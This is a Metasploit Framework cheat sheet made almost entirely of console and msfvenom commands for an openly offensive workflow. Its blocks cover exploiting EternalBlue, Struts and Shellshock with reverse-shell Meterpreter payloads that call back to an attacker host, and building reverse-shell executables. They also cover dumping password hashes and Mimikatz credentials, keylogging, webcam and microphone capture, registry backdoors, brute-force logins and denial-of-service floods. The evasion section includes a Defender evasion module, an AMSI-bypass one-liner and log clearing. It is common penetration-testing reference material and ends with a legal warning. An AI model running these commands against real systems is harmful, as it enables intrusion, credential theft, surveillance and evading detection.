# Metasploit Framework Cheat Sheet

Metasploit is the world's most widely used penetration testing framework. It provides a comprehensive platform for developing, testing, and executing exploit code.

## 📋 Table of Contents
- [Starting Metasploit](#starting-metasploit)
- [Basic Commands](#basic-commands)
- [Database Management](#database-management)
- [Information Gathering](#information-gathering)
- [Scanning and Enumeration](#scanning-and-enumeration)
- [Exploitation](#exploitation)
- [Post-Exploitation](#post-exploitation)
- [Meterpreter](#meterpreter)
- [Payload Generation](#payload-generation)
- [Auxiliary Modules](#auxiliary-modules)
- [Evasion](#evasion)

## Starting Metasploit

```bash
# Start Metasploit console
msfconsole

# Start Metasploit with specific resource script
msfconsole -r script.rc

# Quiet mode (no banner)
msfconsole -q

# Start PostgreSQL database (if not running)
sudo systemctl start postgresql
sudo msfdb init
```

## Basic Commands

### Navigation

```bash
# Show help
help
? 

# Search for modules
search <keyword>
search type:exploit platform:windows smb

# Use a module
use <module_path>
use exploit/windows/smb/ms17_010_eternalblue

# Show module information
info
info <module_path>

# Show module options
show options
show advanced
show evasion

# Set option values
set <option> <value>
set RHOST 192.168.1.100
set LHOST 192.168.1.10

# Unset option
unset <option>
unset PAYLOAD

# Set global value (persists across modules)
setg LHOST 192.168.1.10

# Show current settings
get <option>

# Back to previous context
back

# Execute module
run
exploit
```

### Module Types

```bash
# Show different module types
show exploits          # Exploit modules
show payloads          # Payload modules
show auxiliary         # Auxiliary modules
show post              # Post-exploitation modules
show encoders          # Encoder modules
show nops              # NOP generators
show evasion           # Evasion modules

# Search by type
search type:auxiliary
search type:exploit platform:linux
```

## Database Management

### Database Setup

```bash
# Initialize database
msfdb init

# Check database status
db_status

# Connect to database
db_connect <user>:<pass>@<host>:<port>/<database>

# Rebuild cache
db_rebuild_cache
```

### Workspace Management

```bash
# List workspaces
workspace

# Create workspace
workspace -a <name>

# Switch workspace
workspace <name>

# Delete workspace
workspace -d <name>

# Rename workspace
workspace -r <old_name> <new_name>
```

### Database Commands

```bash
# Show hosts
hosts

# Add host
hosts -a 192.168.1.100

# Delete host
hosts -d 192.168.1.100

# Show services
services

# Add service
services -a -p 80 -s http 192.168.1.100

# Show vulnerabilities
vulns

# Show loot (captured data)
loot

# Show credentials
creds

# Add credentials
creds -a <user> <pass>

# Show notes
notes
```

## Information Gathering

### Reconnaissance

```bash
# Whois lookup
use auxiliary/gather/whois_domain
set DOMAIN example.com
run

# DNS enumeration
use auxiliary/gather/dns_enum
set DOMAIN example.com
run

# Email harvesting
use auxiliary/gather/search_email_collector
set DOMAIN example.com
run

# Social media intelligence
use auxiliary/gather/shodan_search
set QUERY apache
run
```

## Scanning and Enumeration

### Port Scanning

```bash
# TCP port scan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# SYN scan
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
run

# ACK scan
use auxiliary/scanner/portscan/ack
set RHOSTS 192.168.1.0/24
run
```

### Service Enumeration

```bash
# SMB version detection
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SSH version detection
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# HTTP version detection
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# FTP version detection
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run

# MySQL version detection
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.168.1.0/24
run
```

### Vulnerability Scanning

```bash
# SMB vulnerabilities
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Apache Struts vulnerability
use auxiliary/scanner/http/apache_struts_cve_2017_5638
set RHOSTS 192.168.1.100
run

# Heartbleed
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.1.100
set RPORT 443
run
```

### Authentication Testing

```bash
# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# FTP brute force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# SMB brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set SMBPass password123
run

# HTTP basic auth brute force
use auxiliary/scanner/http/http_login
set RHOSTS 192.168.1.100
set AUTH_URI /admin
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## Exploitation

### Basic Exploitation

```bash
# Select exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show required options
show options

# Set target
set RHOST 192.168.1.100

# Select payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# Show target information
show targets

# Set specific target
set TARGET 0

# Check if target is vulnerable
check

# Run exploit
exploit
# or
run
```

### Common Exploits

```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# Apache Struts 2
use exploit/multi/http/struts2_content_type_ognl
set RHOST 192.168.1.100
set TARGETURI /struts2-showcase
exploit

# Shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOST 192.168.1.100
set TARGETURI /cgi-bin/vulnerable.sh
exploit

# WebDAV
use exploit/windows/iis/iis_webdav_upload_asp
set RHOST 192.168.1.100
exploit

# Java RMI
use exploit/multi/misc/java_rmi_server
set RHOST 192.168.1.100
exploit
```

### Multi/Handler

```bash
# Set up listener for reverse shells
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false
exploit -j -z

# Background the handler
bg

# List active sessions
sessions -l

# Interact with session
sessions -i <session_id>
```

## Post-Exploitation

### Session Management

```bash
# List sessions
sessions

# Interact with session
sessions -i 1

# Kill session
sessions -k 1

# Kill all sessions
sessions -K

# Execute command on session
sessions -C <command> -i 1

# Upgrade shell to meterpreter
sessions -u 1
```

### Post-Exploitation Modules

```bash
# Migrate to another process
use post/windows/manage/migrate
set SESSION 1
run

# Dump password hashes
use post/windows/gather/hashdump
set SESSION 1
run

# Get system information
use post/windows/gather/enum_system
set SESSION 1
run

# Capture keystrokes
use post/windows/capture/keylog_recorder
set SESSION 1
run

# Search for files
use post/windows/gather/enum_files
set SESSION 1
set SEARCH_FROM C:\\
set FILE_GLOBS *.doc,*.xls,*.pdf
run

# Enable RDP
use post/windows/manage/enable_rdp
set SESSION 1
run

# Persistence
use post/windows/manage/persistence_exe
set SESSION 1
set REXEPATH /path/to/payload.exe
run
```

## Meterpreter

### Basic Commands

```bash
# Get help
help

# System information
sysinfo

# Get user ID
getuid

# Get process ID
getpid

# List processes
ps

# Migrate to process
migrate <PID>

# Background session
background
# or
Ctrl+Z

# Get current directory
pwd

# Change directory
cd C:\\Windows

# List files
ls
dir

# Download file
download <remote_file> <local_path>

# Upload file
upload <local_file> <remote_path>

# Execute command
execute -f cmd.exe -i -H

# Get shell
shell

# Exit shell (return to meterpreter)
exit
```

### Information Gathering

```bash
# Get environment variables
getenv

# Show network interfaces
ipconfig
ifconfig

# Show network routes
route

# Show ARP cache
arp

# Get network configuration
netstat

# Dump password hashes
hashdump

# Grab system hashes
run post/windows/gather/smart_hashdump
```

### Privilege Escalation

```bash
# Get current privileges
getprivs

# Attempt to elevate privileges
getsystem

# Use specific technique
getsystem -t 1

# Bypass UAC
use exploit/windows/local/bypassuac
set SESSION 1
run

# Token impersonation
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

### Persistence

```bash
# Run at startup
run persistence -X -i 10 -p 4444 -r 192.168.1.10

# Metsvc (service persistence)
run metsvc -A

# Registry persistence
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v backdoor -d 'C:\\backdoor.exe'
```

### Pivoting

```bash
# Add route to subnet through session
route add 10.1.1.0 255.255.255.0 <session_id>

# Show routes
route print

# Port forwarding (local)
portfwd add -l 3389 -p 3389 -r 10.1.1.100

# Port forwarding (reverse)
portfwd add -R -l 4444 -p 4444 -L 192.168.1.10

# List port forwards
portfwd list

# Delete port forward
portfwd delete -l 3389
```

### Advanced Meterpreter

```bash
# Take screenshot
screenshot

# Start webcam
webcam_list
webcam_snap

# Record audio
record_mic

# Dump Kerberos tickets
kerberos

# Load extension
load <extension>
load kiwi           # Mimikatz
load python
load powershell

# Kiwi (Mimikatz) commands
creds_all           # Dump all credentials
lsa_dump_sam        # Dump SAM database
lsa_dump_secrets    # Dump LSA secrets
```

## Payload Generation

### Msfvenom

```bash
# List payloads
msfvenom -l payloads

# List formats
msfvenom -l formats

# List encoders
msfvenom -l encoders

# Generate Windows payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe

# Generate Linux payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o payload.elf

# Generate PHP payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.php

# Generate Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.py

# Generate with encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Generate staged payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe

# Generate stageless payload
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
```

## Auxiliary Modules

### Scanners

```bash
# SNMP scanner
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.0/24
run

# VNC scanner
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS 192.168.1.0/24
run

# MSSQL scanner
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 192.168.1.0/24
run

# Oracle scanner
use auxiliary/scanner/oracle/oracle_login
set RHOSTS 192.168.1.100
run
```

### Denial of Service

```bash
# SYN flood
use auxiliary/dos/tcp/synflood
set RHOST 192.168.1.100
run

# HTTP DoS
use auxiliary/dos/http/slowloris
set RHOST 192.168.1.100
run
```

### Servers

```bash
# SMB capture server
use auxiliary/server/capture/smb
set JOHNPWFILE /tmp/hashes.txt
run

# HTTP capture server
use auxiliary/server/capture/http
run

# FTP server
use auxiliary/server/ftp
run
```

## Evasion

### Encoding

```bash
# Use encoder
set ENCODER x86/shikata_ga_nai

# Multiple iterations
set ENCODER x86/shikata_ga_nai
set ITERATIONS 10

# Show available encoders
show encoders
```

### Evasion Modules

```bash
# Windows Defender evasion
use evasion/windows/windows_defender_exe
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
run

# Binary padding
use evasion/windows/windows_defender_exe
set PADDING 100000
```

### Anti-Detection

```bash
# Disable AMSI (PowerShell)
use post/windows/manage/powershell/exec_powershell
set COMMAND "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
set SESSION 1
run

# Clear event logs
clearev
```

## Resource Scripts

```bash
# Save commands to script
makerc /root/script.rc

# Run script
msfconsole -r /root/script.rc

# Example script
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

## Tips and Tricks

```bash
# Search with keywords
search eternalblue
search type:exploit platform:windows cve:2017

# Show advanced options
show advanced

# Show payloads for exploit
show payloads

# Show compatible targets
show targets

# Check if target is vulnerable
check

# Set verbose output
set VERBOSE true

# Set console logging
spool /root/metasploit.log

# Database import
db_import nmap_results.xml

# Generate documentation
info -d
```

## Resources

- [Metasploit Documentation](https://docs.rapid7.com/metasploit/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 Metasploit](https://www.metasploit.com/)

## Legal Notice

⚠️ **WARNING**: Only use Metasploit on systems you own or have explicit written permission to test. Unauthorized use is illegal and unethical.

---

**Pro Tip**: Always use workspaces to organize your penetration tests and keep data separate for different engagements.

